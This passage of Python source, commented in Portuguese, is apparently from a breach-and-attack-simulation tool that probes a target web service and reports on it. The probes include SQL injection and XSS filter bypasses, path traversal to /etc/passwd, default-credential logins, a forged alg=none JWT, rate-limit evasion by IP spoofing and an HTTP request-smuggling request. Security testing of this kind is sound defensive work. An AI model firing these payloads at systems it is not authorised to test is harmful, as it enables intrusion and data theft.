        t3 = {"id": "T1190", "name": "WAF Bypass Attempt (SQLi)",
              "status": "blocked" if waf_standard else "found",
              "http_status": r3.status_code if r3 is not None else 0,
              "detail": t3_detail}
        if not waf_standard: hits += 1
        techniques.append(t3)

        # T3b: WAF Bypass via SQL comment injection /**/
        r3b = probe("/?id=1/**/UNION/**/SELECT/**/1--")
        bypassed = r3b is not None and r3b.status_code == 200
        t3b = {"id": "T1190b", "name": "WAF Bypass - Comment Injection",
               "status": "found" if bypassed else "blocked",
               "http_status": r3b.status_code if r3b is not None else 0,
               "detail": (f"SQLi via /**/ comment bypassed WAF (HTTP {r3b.status_code})" if bypassed else
                          "WAF bloqueou comment injection")}
        if bypassed: hits += 1
        techniques.append(t3b)

        # T4: XSS Probe (lowercase)
        r4 = probe("/?q=%3Cscript%3Ealert(1)%3C/script%3E")
        xss_blocked = r4 is None or (r4 is not None and r4.status_code == 403)
        t4 = {"id": "T1059", "name": "XSS Probe",
              "status": "blocked" if xss_blocked else "found",
              "http_status": r4.status_code if r4 is not None else 0,
              "detail": ("WAF bloqueou XSS via TCP reset" if r4 is None else
                         "WAF bloqueou XSS (403)" if r4.status_code == 403 else
                         f"XSS não filtrado (HTTP {r4.status_code})")}
        if not xss_blocked: hits += 1
        techniques.append(t4)

        # T4b: XSS Case-Mix Bypass <ScRiPt>
        r4b = probe("/?q=<ScRiPt>alert(1)</ScRiPt>")
        xss_bypass = r4b is not None and r4b.status_code == 200
        t4b = {"id": "T1059b", "name": "WAF Bypass - Case Mix XSS",
               "status": "found" if xss_bypass else "blocked",
               "http_status": r4b.status_code if r4b is not None else 0,
               "detail": (f"XSS case-mix bypassed WAF (HTTP {r4b.status_code})" if xss_bypass else
                          "WAF bloqueou XSS case-mix")}
        if xss_bypass: hits += 1
        techniques.append(t4b)

        # T5: Auth — acesso sem JWT
        r5 = probe("/dashboard")
        no_auth = r5 is not None and r5.status_code == 200
        t5 = {"id": "T1078", "name": "Access Without Auth",
              "status": "found" if no_auth else "blocked",
              "http_status": r5.status_code if r5 is not None else 0,
              "detail": "Dashboard acessível sem JWT (200)" if no_auth else f"Proteção JWT ativa ({r5.status_code if r5 is not None else 0})"}
        if no_auth: hits += 1
        techniques.append(t5)

        # T6: Credential Brute Force (login fraco)
        r6 = probe("/login", method="POST", data="username=admin&password=admin")
        auth_ok = r6 is not None and r6.status_code == 200 and b"csrf" not in (r6.content or b"")
        t6 = {"id": "T1110", "name": "Default Credential Test",
              "status": "found" if auth_ok else "blocked",
              "http_status": r6.status_code if r6 is not None else 0,
              "detail": "Login com admin:admin retornou 200" if auth_ok else f"Login protegido ({r6.status_code if r6 is not None else 0})"}
        if auth_ok: hits += 1
        techniques.append(t6)

    if severity in ("High", "Critical") or num_techniques >= 6:
        # T7: Rate Limit — 40 requests para garantir passar do limite 30r/10s
        codes = []
        for _ in range(40):
            rr = probe("/api/v1/users")
            if rr is not None: codes.append(rr.status_code)
        rate_limited = 429 in codes
        first_429 = next((i+1 for i, c in enumerate(codes) if c == 429), None)
        if not codes:
            t7_status, t7_detail = "unknown", "Serviço inacessível — rate limit não verificável"
        elif rate_limited:
            t7_status, t7_detail = "blocked", f"Rate limiting ativo — 429 no request #{first_429}"
        else:
            t7_status, t7_detail = "found", f"Sem rate limiting em {len(codes)} requests consecutivos"
            hits += 1
        t7 = {"id": "T1499", "name": "Rate Limit Probe",
              "status": t7_status,
              "http_status": 429 if rate_limited else (codes[-1] if codes else 0),
              "detail": t7_detail}
        techniques.append(t7)

        # T8: Path Traversal (standard + double-encoded)
        r8 = probe("/?file=../../etc/passwd")
        r8b = probe("/?file=..%2F..%2Fetc%2Fpasswd")
        lfi_blocked = (r8 is None or (r8 is not None and r8.status_code == 403)) and \
                      (r8b is None or (r8b is not None and r8b.status_code == 403))
        t8 = {"id": "T1083", "name": "Path Traversal Probe",
              "status": "blocked" if lfi_blocked else "found",
              "http_status": r8.status_code if r8 is not None else 0,
              "detail": ("WAF bloqueou LFI (direto e URL-encoded)" if lfi_blocked else
                         f"LFI não bloqueado — padrão={r8.status_code if r8 is not None else 0}, encoded={r8b.status_code if r8b is not None else 0}")}
        if not lfi_blocked: hits += 1
        techniques.append(t8)

        # T9: Admin API sem auth
        r9 = probe("/api/v1/users")
        api_open = r9 is not None and r9.status_code == 200
        t9 = {"id": "T1087", "name": "Admin API Enumeration",
              "status": "found" if api_open else "blocked",
              "http_status": r9.status_code if r9 is not None else 0,
              "detail": "API /users acessível sem auth" if api_open else f"API protegida ({r9.status_code if r9 is not None else 0})"}
        if api_open: hits += 1
        techniques.append(t9)

        # T9b: JWT Known Token Test (demo/predictable token)
        demo_jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.demo"
        r9b = probe("/api/v1/users", headers={"Authorization": f"Bearer {demo_jwt}"})
        jwt_works = r9b is not None and r9b.status_code == 200
        t9b = {"id": "T1078b", "name": "JWT Auth - Known Token Test",
               "status": "found" if jwt_works else "blocked",
               "http_status": r9b.status_code if r9b is not None else 0,
               "detail": (f"Demo JWT aceito como auth válida (HTTP {r9b.status_code})" if jwt_works else
                          "JWT demo token rejeitado corretamente")}
        if jwt_works: hits += 1
        techniques.append(t9b)

    if severity == "Critical" or num_techniques >= 8:
        # T10: Scanner UA bypass — sqlmap string exacta
        r10 = probe("/", headers={"User-Agent": "sqlmap/1.7"})
        if r10 is None:
            t10_status, t10_detail = "unknown", "Serviço inacessível — UA detection não verificável"
        elif r10.status_code == 403:
            t10_status, t10_detail = "blocked", "WAF bloqueia User-Agent sqlmap/1.7"
        else:
            t10_status, t10_detail = "found", f"Scanner UA sqlmap não detectado (HTTP {r10.status_code})"
            hits += 1
        t10 = {"id": "T1595", "name": "Scanner UA Detection (sqlmap)",
               "status": t10_status,
               "http_status": r10.status_code if r10 is not None else 0,
               "detail": t10_detail}
        techniques.append(t10)

        # T10b: Generic HTTP Client UA (python-requests/curl — fácil de usar para evasão)
        r10b = probe("/", headers={"User-Agent": "python-requests/2.31.0"})
        if r10b is None:
            t10b_status, t10b_detail = "unknown", "Serviço inacessível — generic UA não verificável"
        elif r10b.status_code == 403:
            t10b_status, t10b_detail = "blocked", "Generic HTTP client bloqueado pelo WAF"
        else:
            t10b_status, t10b_detail = "found", f"python-requests/curl não bloqueados — evasão de UA trivial (HTTP {r10b.status_code})"
            hits += 1
        t10b = {"id": "T1595b", "name": "Scanner UA - Generic HTTP Client",
                "status": t10b_status,
                "http_status": r10b.status_code if r10b is not None else 0,
                "detail": t10b_detail}
        techniques.append(t10b)

        # T11: CSRF — verifica presença de token
        r11 = probe("/login")
        if r11 is None:
            t11_status, t11_detail = "unknown", "Serviço inacessível — CSRF não verificável"
        elif b"csrf" in (r11.content or b"").lower():
            t11_status, t11_detail = "blocked", "Token CSRF presente no formulário"
        else:
            t11_status, t11_detail = "found", "Sem proteção CSRF detectada"
            hits += 1
        t11 = {"id": "T1185", "name": "CSRF Token Check",
               "status": t11_status,
               "http_status": r11.status_code if r11 is not None else 0,
               "detail": t11_detail}
        techniques.append(t11)

        # T12: TLS / HTTPS Enforcement
        r12 = probe("/")
        if r12 is None:
            t12_status, t12_detail = "unknown", "Serviço inacessível — TLS não verificável"
        else:
            tls_redirect = r12.status_code in (301, 302) and r12.headers.get("Location", "").startswith("https://")
            hsts_present = "Strict-Transport-Security" in r12.headers
            if tls_redirect or hsts_present:
                parts = []
                if tls_redirect: parts.append("redirect HTTPS ativo")
                if hsts_present: parts.append("HSTS configurado")
                t12_status, t12_detail = "blocked", " | ".join(parts)
            else:
                t12_status = "found"
                t12_detail = f"Serviço em HTTP puro sem redirect para HTTPS (HTTP {r12.status_code})"
                hits += 1
        t12 = {"id": "T1602", "name": "TLS / HTTPS Enforcement",
               "status": t12_status,
               "http_status": r12.status_code if r12 is not None else 0,
               "detail": t12_detail}
        techniques.append(t12)

        # T13: Cookie Security Flags
        r13 = probe("/login", method="POST", data="username=probe&password=probe")
        set_cookie = r13.headers.get("Set-Cookie", "") if r13 is not None else ""
        missing_flags = []
        if set_cookie:
            if "HttpOnly" not in set_cookie: missing_flags.append("HttpOnly")
            if "Secure" not in set_cookie: missing_flags.append("Secure")
            if "SameSite" not in set_cookie: missing_flags.append("SameSite")
        if not set_cookie:
            t13_status, t13_detail = "blocked", "Sem cookies de sessão detectados no /login"
        elif missing_flags:
            t13_status = "found"
            t13_detail = f"Cookie de sessão sem flags obrigatórias: {', '.join(missing_flags)}"
            hits += 1
        else:
            t13_status, t13_detail = "blocked", "Cookie com HttpOnly, Secure e SameSite configurados"
        t13 = {"id": "T1592b", "name": "Cookie Security Flags",
               "status": t13_status,
               "http_status": r13.status_code if r13 is not None else 0,
               "detail": t13_detail}
        techniques.append(t13)

        # T14: HTTP Method Enumeration (OPTIONS)
        r14 = probe("/", method="OPTIONS")
        if r14 is None:
            t14_status, t14_detail = "unknown", "Serviço inacessível — métodos não verificáveis"
        else:
            allow = r14.headers.get("Allow", r14.headers.get("Access-Control-Allow-Methods", ""))
            dangerous = [m for m in ("PUT", "DELETE", "TRACE", "PATCH") if m in allow.upper()]
            if dangerous:
                t14_status = "found"
                t14_detail = f"Métodos perigosos habilitados via OPTIONS: {', '.join(dangerous)}"
                hits += 1
            else:
                t14_status = "blocked"
                t14_detail = f"Métodos restritos (Allow: {allow or 'não exposto'})"
        t14 = {"id": "T1557", "name": "HTTP Method Enumeration",
               "status": t14_status,
               "http_status": r14.status_code if r14 is not None else 0,
               "detail": t14_detail}
        techniques.append(t14)

        # T15: JWT Algorithm None Bypass
        _hdr = _b64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        _pay = _b64.b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b"=").decode()
        r15 = probe("/api/v1/users", headers={"Authorization": f"Bearer {_hdr}.{_pay}."})
        if r15 is None:
            t15_status, t15_detail = "unknown", "Serviço inacessível — JWT alg:none não verificável"
        elif r15 is not None and r15.status_code == 200:
            t15_status = "found"
            t15_detail = "JWT alg=none ACEITO — bypass de autenticação confirmado (HTTP 200)"
            hits += 1
        else:
            t15_status, t15_detail = "blocked", f"JWT alg=none rejeitado corretamente (HTTP {r15.status_code})"
        t15 = {"id": "T1190c", "name": "JWT Algorithm None Bypass",
               "status": t15_status,
               "http_status": r15.status_code if r15 is not None else 0,
               "detail": t15_detail}
        techniques.append(t15)

        # T16: CORS Misconfiguration
        r16 = probe("/api/v1/users", headers={"Origin": "https://evil-corp.com"})
        if r16 is None:
            t16_status, t16_detail = "unknown", "Serviço inacessível — CORS não verificável"
        else:
            acao = r16.headers.get("Access-Control-Allow-Origin", "")
            acac = r16.headers.get("Access-Control-Allow-Credentials", "")
            cors_vuln = acao in ("*", "https://evil-corp.com") or "evil-corp.com" in acao
            if cors_vuln:
                t16_status = "found"
                t16_detail = f"CORS permissivo: ACAO={acao} ACAC={acac} — origem refletida ou wildcard"
                hits += 1
            else:
                t16_status = "blocked"
                t16_detail = f"CORS restritivo (Access-Control-Allow-Origin: {acao or 'não exposto'})"
        t16 = {"id": "T1190e", "name": "CORS Misconfiguration",
               "status": t16_status,
               "http_status": r16.status_code if r16 is not None else 0,
               "detail": t16_detail}
        techniques.append(t16)

        # T17: Sensitive File Exposure (.git, .env, backup)
        t17_http = 0
        sensitive_exposed = []
        for sp in ("/.git/HEAD", "/.env", "/.htaccess", "/backup.zip"):
            rs = probe(sp)
            if rs is not None:
                t17_http = rs.status_code
                if rs.status_code == 200:
                    sensitive_exposed.append(sp)
        if sensitive_exposed:
            t17_status = "found"
            t17_detail = f"Arquivos sensíveis expostos: {', '.join(sensitive_exposed)}"
            hits += 1
        else:
            t17_status = "blocked"
            t17_detail = "Arquivos sensíveis protegidos (.git, .env, .htaccess, backup)"
        t17 = {"id": "T1087b", "name": "Sensitive File Exposure",
               "status": t17_status,
               "http_status": t17_http,
               "detail": t17_detail}
        techniques.append(t17)

        # T18: Rate Limit Bypass via X-Forwarded-For (spoof IP para escapar do rate limit)
        # Envia 50 requests fingindo ser IPs diferentes — se nenhum 429, bypass confirmado
        codes18 = []
        for i in range(50):
            spoofed_ip = f"10.0.{i // 256}.{i % 256}"
            rr = probe("/api/v1/users", headers={"X-Forwarded-For": spoofed_ip, "X-Real-IP": spoofed_ip})
            if rr is not None:
                codes18.append(rr.status_code)
        if not codes18:
            t18_status = "unknown"
            t18_detail = "Serviço inacessível — bypass não verificável"
        elif 429 not in codes18:
            t18_status = "found"
            t18_detail = f"Rate limit bypassado via X-Forwarded-For — {len(codes18)} requests sem 429 (IP spoofing aceito)"
            hits += 1
        else:
            first_429 = next((i + 1 for i, c in enumerate(codes18) if c == 429), None)
            t18_status = "blocked"
            t18_detail = f"Rate limit resiste ao X-Forwarded-For spoofing — 429 no request #{first_429}"
        t18 = {"id": "T1499b", "name": "Rate Limit Bypass (X-Forwarded-For)",
               "status": t18_status,
               "http_status": codes18[-1] if codes18 else 0,
               "detail": t18_detail}
        techniques.append(t18)

        # T19: API Info Disclosure — /api/v1/status vaza env, versão e nome do server
        r19 = probe("/api/v1/status")
        if r19 is None:
            t19_status, t19_detail = "unknown", "Endpoint /api/v1/status inacessível"
        elif r19.status_code == 200:
            try:
                body = r19.json()
            except Exception:
                body = {}
            leaks = []
            if body.get("env"):    leaks.append(f"env={body['env']}")
            if body.get("version"): leaks.append(f"version={body['version']}")
            if body.get("server"):  leaks.append(f"server={body['server']}")
            if leaks:
                t19_status = "found"
                t19_detail = f"API /status expõe informações sensíveis: {', '.join(leaks)}"
                hits += 1
            else:
                t19_status = "blocked"
                t19_detail = "API /status acessível mas sem dados sensíveis"
        else:
            t19_status = "blocked"
            t19_detail = f"API /status retornou HTTP {r19.status_code}"
        t19 = {"id": "T1592c", "name": "API Info Disclosure (/api/v1/status)",
               "status": t19_status,
               "http_status": r19.status_code if r19 is not None else 0,
               "detail": t19_detail}
        techniques.append(t19)

        # T20: API v2 Metrics Disclosure — /api/v2/metrics vaza métricas de produção
        r20 = probe("/api/v2/metrics")
        if r20 is None:
            t20_status, t20_detail = "unknown", "Endpoint /api/v2/metrics inacessível"
        elif r20.status_code == 200:
            try:
                body20 = r20.json()
            except Exception:
                body20 = {}
            leaked_keys = [k for k in ("requests_total", "errors_total", "avg_latency_ms", "uptime_s") if k in body20]
            if leaked_keys:
                t20_status = "found"
                t20_detail = f"Métricas internas expostas sem auth: {', '.join(f'{k}={body20[k]}' for k in leaked_keys)}"
                hits += 1
            else:
                t20_status = "blocked"
                t20_detail = "Endpoint /api/v2/metrics acessível mas sem dados reconhecíveis"
        else:
            t20_status = "blocked"
            t20_detail = f"Métricas protegidas (HTTP {r20.status_code})"
        t20 = {"id": "T1592d", "name": "API v2 Metrics Disclosure",
               "status": t20_status,
               "http_status": r20.status_code if r20 is not None else 0,
               "detail": t20_detail}
        techniques.append(t20)

        # T21: Recon via robots.txt e security.txt
        recon_exposed = []
        recon_last_http = 0
        for rpath in ("/robots.txt", "/.well-known/security.txt", "/sitemap.xml"):
            rr21 = probe(rpath)
            if rr21 is not None:
                recon_last_http = rr21.status_code
                if rr21.status_code == 200 and len(rr21.content or b"") > 10:
                    recon_exposed.append(f"{rpath} ({len(rr21.content)}b)")
        if recon_exposed:
            t21_status = "found"
            t21_detail = f"Arquivos de recon públicos: {', '.join(recon_exposed)}"
            hits += 1
        else:
            t21_status = "blocked"
            t21_detail = "robots.txt / security.txt / sitemap.xml não expostos (404)"
        t21 = {"id": "T1596b", "name": "Recon via robots.txt / security.txt",
               "status": t21_status,
               "http_status": recon_last_http,
               "detail": t21_detail}
        techniques.append(t21)

        # T22: Host Header Injection (testa se Host é refletido em Location redirect)
        evil_host = "evil-pentest.internal"
        r22 = probe("/", headers={"Host": evil_host})
        if r22 is None:
            t22_status, t22_detail = "unknown", "Serviço inacessível — Host injection não verificável"
        else:
            location = r22.headers.get("Location", "")
            reflected = evil_host in location or evil_host in (r22.content or b"").decode("utf-8", errors="ignore")
            if reflected:
                t22_status = "found"
                t22_detail = f"Host header refletido no redirect: Location={location}"
                hits += 1
            else:
                t22_status = "blocked"
                t22_detail = f"Host header não refletido (HTTP {r22.status_code}, Location={location or 'n/a'})"
        t22 = {"id": "T1557b", "name": "Host Header Injection",
               "status": t22_status,
               "http_status": r22.status_code if r22 is not None else 0,
               "detail": t22_detail}
        techniques.append(t22)

        # T23: HTTP Request Smuggling — probe CL.TE (Content-Length + Transfer-Encoding conflitantes)
        # Um 400 imediato ou timeout indica parser estrito; 200/timeout com resposta dividida = vuln
        try:
            import socket as _sock, ssl as _ssl
            parsed = base.replace("https://", "").replace("http://", "").split(":")
            smug_host = parsed[0]
            smug_port = int(parsed[1]) if len(parsed) > 1 else 80
            s23 = _sock.create_connection((smug_host, smug_port), timeout=5)
            smuggle_req = (
                "POST / HTTP/1.1\r\n"
                f"Host: {smug_host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "X"
            )
            s23.sendall(smuggle_req.encode())
            resp23 = b""
            s23.settimeout(3)
            try:
                while True:
                    chunk = s23.recv(512)
                    if not chunk:
                        break
                    resp23 += chunk
            except Exception:
                pass
            s23.close()
            resp_str = resp23.decode("utf-8", errors="ignore")
            if "400" in resp_str[:20]:
                t23_status = "blocked"
                t23_detail = "HTTP Request Smuggling rejeitado — servidor retornou 400 Bad Request para CL.TE"
            elif "200" in resp_str[:20] or "301" in resp_str[:20]:
                t23_status = "found"
                t23_detail = "Possível HTTP Request Smuggling — servidor aceitou request CL.TE conflitante"
                hits += 1
            else:
                t23_status = "blocked"
                t23_detail = f"CL.TE probe: resposta {resp_str[:50].strip()!r} — parser estrito"
        except Exception as e23:
            t23_status = "unknown"
            t23_detail = f"HTTP Smuggling probe falhou: {str(e23)[:80]}"
        t23 = {"id": "T1190f", "name": "HTTP Request Smuggling (CL.TE)",
               "status": t23_status,
               "http_status": 0,
               "detail": t23_detail}
        techniques.append(t23)

    # Enriquecer todas as técnicas com CVSS, compliance e remediação
    for t in techniques:
        meta = _TECHNIQUE_META.get(t["id"], {})
        t["cvss_score"] = meta.get("cvss", 0.0)
        t["cvss_vector"] = meta.get("vector", "")
        t["cvss_severity"] = meta.get("severity", "Info")
        t["compliance"] = meta.get("compliance", [])
        t["remediation"] = meta.get("remediation", "") if t["status"] == "found" else ""

    # Risk score CVSS-weighted: % do risco total possível que foi explorado
    total_cvss = sum(t["cvss_score"] for t in techniques)
    found_cvss = sum(t["cvss_score"] for t in techniques if t["status"] == "found")
    score = round((found_cvss / max(total_cvss, 0.01)) * 100, 1)

    # Detection coverage: % das técnicas que foram detectadas/bloqueadas
    testable = [t for t in techniques if t["status"] in ("found", "blocked")]
    detected = [t for t in testable if t["status"] == "blocked"]
    detection_coverage_pct = round(len(detected) / max(len(testable), 1) * 100, 1)

    # Adicionar detection_status em cada técnica
    for t in techniques:
        if t["status"] == "blocked":
            t["detection_status"] = "detected"
        elif t["status"] == "found":
            t["detection_status"] = "undetected"
        else:
            t["detection_status"] = "unknown"

    # Contagem por severidade para o webhook
    critical_count = sum(1 for t in techniques if t["status"] == "found" and t.get("cvss_severity") == "Critical")

    results_payload = {
        "techniques": techniques,
        "hits": hits,
        "total": len(techniques),
        "target": target,
        "detection_coverage_pct": detection_coverage_pct,
    }

    db2 = SessionLocal()
    try:
        sim = db2.query(Simulation).filter(Simulation.id == sim_id).first()
        if sim:
            user_id = sim.user_id
            sim.status = "completed"
            sim.score = score
            sim.results = results_payload
            db2.commit()
            # Disparar webhooks pós-simulação
            _fire_webhooks_sync(user_id, "simulation_complete", {
                "event": "simulation_complete",
                "simulation_id": sim_id,
                "target": target,
                "score": score,
                "critical_count": critical_count,
                "detection_coverage_pct": detection_coverage_pct,
                "timestamp": datetime.utcnow().isoformat(),
            })
            # Atualizar scheduled scan last_run se existir
            sched = db2.query(ScheduledScan).filter(
                ScheduledScan.playbook_id == sim.playbook_id,
                ScheduledScan.target == target,
                ScheduledScan.user_id == user_id,
                ScheduledScan.enabled == True,
            ).first()
            if sched:
                sched.last_run = datetime.utcnow()
                db2.commit()
            # WebSocket broadcast e notificação de conclusão
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(_ws_broadcast({
                    "type": "simulation_update",
                    "simulation_id": sim_id,
                    "status": "completed",
                    "score": score,
                    "target": target,
                    "timestamp": datetime.utcnow().isoformat(),
                }), loop)
                sev_label = "CRÍTICO" if score >= 70 else "ALTO" if score >= 40 else "MÉDIO" if score >= 20 else "BAIXO"
                notif_type = "critical" if score >= 70 else "warning" if score >= 40 else "info"
                _n = Notification(user_id=user_id, title=f"Simulação Concluída — Risco {sev_label}",
                    message=f"{playbook_name} → {target} | Score: {score}% | {hits} técnicas exploráveis",
                    type=notif_type)
                db2.add(_n)
                _audit_log = AuditLog(module="BAS", action="Simulação concluída",
                    details=f"{playbook_name} → {target} | score={score}%", user_id=user_id)
                db2.add(_audit_log)
                db2.commit()
            except Exception:
                pass
    finally:
        db2.close()

    _operation_logs.append({
        "module": "BAS", "action": "Simulação concluída",
        "details": f"{playbook_name} → {target} | score={score}% | {len(techniques)} técnicas | detecção={detection_coverage_pct}%",
        "timestamp": datetime.utcnow().isoformat(),
    })

@app.post("/api/bas/execute")
async def execute_playbook(
    req: PlaybookExecuteRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    playbook = db.query(Playbook).filter(Playbook.id == req.playbook_id, Playbook.user_id == current_user.id).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")
    simulation = Simulation(user_id=current_user.id, playbook_id=req.playbook_id, target=req.target, status="running", score=0.0)
    db.add(simulation)
    db.commit()
    db.refresh(simulation)
    threading.Thread(
        target=_bas_run,
        args=(simulation.id, playbook.name, req.target, playbook.severity, playbook.techniques),
        daemon=True
    ).start()
    _operation_logs.append({"module": "BAS", "action": "Simulação iniciada", "details": f"{playbook.name} → {req.target}", "timestamp": datetime.utcnow().isoformat()})
    _audit(db, "BAS", "Simulação iniciada", f"{playbook.name} → {req.target}", current_user.id)
    _create_notification(db, current_user.id, "Simulação iniciada", f"BAS: {playbook.name} contra {req.target}", "info")
    return {"id": simulation.id, "status": "running", "message": "Simulação iniciada"}

@app.get("/api/bas/simulations")
async def get_simulations(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sims = db.query(Simulation).filter(Simulation.user_id == current_user.id).all()
    return {"simulations": [
        {"id": s.id, "playbook_id": s.playbook_id, "target": s.target, "status": s.status,
         "score": s.score, "date": s.date.isoformat(), "results": s.results or {}}
        for s in sims
    ]}


# ── Reporting ────────────────────────────────────────────────────────────────

def _collect_report_data(user_id: str, db) -> dict:
    """Coleta dados reais de todos os módulos para o relatório."""
    sims = db.query(Simulation).filter(Simulation.user_id == user_id).order_by(Simulation.date.desc()).limit(20).all()
    sim_data = []
    for s in sims:
        res = s.results or {}
        techniques = res.get("techniques", [])
        vulns = [t for t in techniques if t.get("status") == "found"]
        sim_data.append({
            "playbook": s.playbook_id or "—",
            "target": res.get("target", s.target or "—"),
            "status": s.status,
            "score": s.score or 0,
            "hits": len(vulns),
            "total": len(techniques),
            "techniques": techniques,
            "vulns": vulns,
            "created_at": s.date.isoformat() if s.date else "—",
        })

    listeners = db.query(Listener).filter(Listener.user_id == user_id).all()
    beacons   = db.query(Beacon).filter(Beacon.user_id == user_id).all()
    payloads  = db.query(Payload).filter(Payload.user_id == user_id).all()

    # Agentes OS-level
    agents = db.query(PenteiaAgent).filter(PenteiaAgent.user_id == user_id).all()
    agent_data = []
    for a in agents:
        tasks = db.query(AgentTask).filter(
            AgentTask.agent_id == a.id,
            AgentTask.status == "completed"
        ).all()
        agent_data.append({
            "hostname": a.hostname, "ip": a.ip, "os_info": a.os_info,
            "username": a.username, "last_seen": a.last_seen.isoformat() if a.last_seen else "—",
            "results": [t.result for t in tasks if t.result],
        })

    return {
        "simulations": sim_data,
        "listeners": [{"name": l.name, "host": l.host, "port": l.port, "protocol": l.protocol} for l in listeners],
        "beacons":    [{"hostname": b.hostname, "ip": b.ip, "user": b.user, "status": b.status} for b in beacons],
        "payloads":   [{"name": p.name, "type": p.type, "size": p.size} for p in payloads],
        "agents":     agent_data,
    }


_TECH_LAYMAN = {
    "T1590":  ("Identificação do Servidor",        "O servidor revela qual software usa. Um atacante usa essa informação para escolher ataques específicos contra essa versão.", "Configurar o servidor para não divulgar nome nem versão do software."),
    "T1592":  ("Cabeçalhos de Segurança",          "Configurações que dizem ao navegador como se proteger de ataques. Faltando, o site fica vulnerável a sequestros de sessão e ataques de conteúdo.", "Ativar os cabeçalhos de segurança HTTP recomendados pelo padrão OWASP."),
    "T1190":  ("Injeção de Código no Banco (SQLi)","Envio de comandos maliciosos no lugar de dados normais. Pode vazar, alterar ou destruir toda a base de dados da empresa.", "Validar e sanitizar todos os dados recebidos. Usar consultas parametrizadas."),
    "T1190b": ("Injeção SQL com Disfarce",         "Variação do ataque anterior usando truques para burlar filtros básicos de segurança.", "Implementar WAF (Firewall de Aplicação Web) com regras atualizadas."),
    "T1059":  ("Injeção de Script (XSS)",          "Código malicioso inserido em páginas web que executa no navegador de outros usuários, podendo roubar senhas e sessões.", "Escapar todo conteúdo exibido ao usuário. Ativar Content Security Policy (CSP)."),
    "T1059b": ("Injeção de Script Disfarçada",     "Variação do XSS que usa letras alternadas para burlar filtros simples.", "Usar biblioteca de sanitização validada e WAF com detecção de XSS."),
    "T1078":  ("Acesso sem Autenticação",          "Tentativa de acessar áreas restritas sem usuário e senha.", "Protegido — autenticação JWT obrigatória em todas as rotas privadas."),
    "T1078b": ("Token de Acesso Falso",            "Tentativa de usar um token de autenticação inválido ou adulterado.", "Protegido — sistema rejeita tokens inválidos corretamente."),
    "T1110":  ("Teste de Senhas Padrão",           "Tentativa de login usando senhas comuns (admin/admin, root/123456 etc.).", "Protegido — login bloqueado ou senha padrão não funciona."),
    "T1499":  ("Limite de Requisições (Rate Limit)","Teste para verificar se o servidor bloqueia usuários que fazem muitas requisições em pouco tempo (prevenção de força bruta e DDoS).", "Configurar limite de requisições por IP (ex: máx. 10 por segundo). Retornar erro 429."),
    "T1083":  ("Acesso a Arquivos Internos (LFI)", "Tentativa de ler arquivos internos do servidor via URL (ex: senhas do sistema).", "Validar e bloquear paths com ../ e variações codificadas na URL."),
    "T1087":  ("Enumeração de Usuários/APIs",      "Tentativa de listar usuários e endpoints da API sem permissão.", "Protegido — API exige autenticação válida."),
    "T1595":  ("Detecção de Ferramentas de Ataque","O servidor reconhece e bloqueia ferramentas conhecidas de hacking (sqlmap, nikto etc.).", "Configurar bloqueio de User-Agents de scanners conhecidos no WAF."),
    "T1595b": ("Clientes HTTP Genéricos",          "Teste se scripts e ferramentas simples de automação HTTP são bloqueadas.", "Configurar WAF para bloquear clientes HTTP não-browser comuns (curl, python-requests)."),
    "T1185":  ("Proteção CSRF",                    "Verifica se formulários possuem token anti-falsificação de requisição.", "Protegido — tokens CSRF presentes e validados."),
    "T1602":  ("HSTS — Forçar HTTPS",             "Verifica se o site força conexão criptografada sempre.", "Protegido — HSTS configurado corretamente."),
    "T1592b": ("Cookies de Sessão Seguros",        "Verifica se os cookies de login têm flags de segurança (HTTPOnly, Secure).", "Protegido — sem cookies inseguros expostos."),
    "T1557":  ("Métodos HTTP Perigosos",           "Verifica se métodos como PUT, DELETE e OPTIONS estão expostos sem necessidade.", "Protegido — somente métodos necessários permitidos."),
    "T1190c": ("Falha na Validação de Token JWT",  "Tenta usar truques para forjar tokens de autenticação sem a chave secreta.", "Protegido — algoritmo 'none' rejeitado corretamente."),
    "T1190e": ("Controle de Origem (CORS)",        "Verifica se qualquer site externo consegue fazer requisições autenticadas.", "Protegido — CORS restritivo configurado."),
    "T1087b": ("Arquivos Sensíveis Expostos",      "Tentativa de acessar arquivos de configuração, senhas e código-fonte via URL.", "Protegido — .git, .env, backups e configs bloqueados."),
    # Agente OS-level
    "T1082":  ("Informações do Sistema",           "Coleta de dados do sistema operacional, usuário logado e configurações do servidor.", "Restringir quem pode acessar informações de sistema. Usar princípio do menor privilégio."),
    "T1548":  ("Escalada de Privilégio",           "Verifica se existe forma de um usuário comum virar administrador do sistema.", "Remover binários SUID desnecessários. Configurar sudo com princípio do menor privilégio."),
    "T1552":  ("Senhas e Credenciais Expostas",    "Busca por senhas salvas em arquivos, histórico de comandos e variáveis de ambiente.", "Nunca salvar senhas em arquivos. Usar cofre de segredos (ex: HashiCorp Vault, AWS Secrets Manager)."),
    "T1053":  ("Tarefas Automáticas Suspeitas",    "Verifica tarefas agendadas que podem ser usadas para manter acesso persistente.", "Auditar e remover tarefas agendadas não autorizadas. Monitorar criação de novos jobs."),
    "T1016":  ("Reconhecimento de Rede Interna",   "Mapeamento de outros servidores e serviços acessíveis dentro da rede.", "Segmentar rede com VLANs. Implementar firewall interno entre serviços."),
    "T1057":  ("Processos Suspeitos em Execução",  "Verifica se ferramentas de ataque estão rodando no servidor.", "Implementar allowlist de processos. Monitorar execução de processos com EDR."),
}

_SEV_LABEL = {"Critical": "CRÍTICO", "High": "ALTO", "Medium": "MÉDIO", "Low": "BAIXO"}
_SEV_COLOR = {
    "Critical": "#c0392b",
    "High":     "#e67e22",
    "Medium":   "#f39c12",
    "Low":      "#2980b9",
    "":         "#7f8c8d",
}

def _build_pdf(title: str, report_type: str, data: dict, generated_at: str) -> bytes:  # noqa: C901
    import math
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib import colors
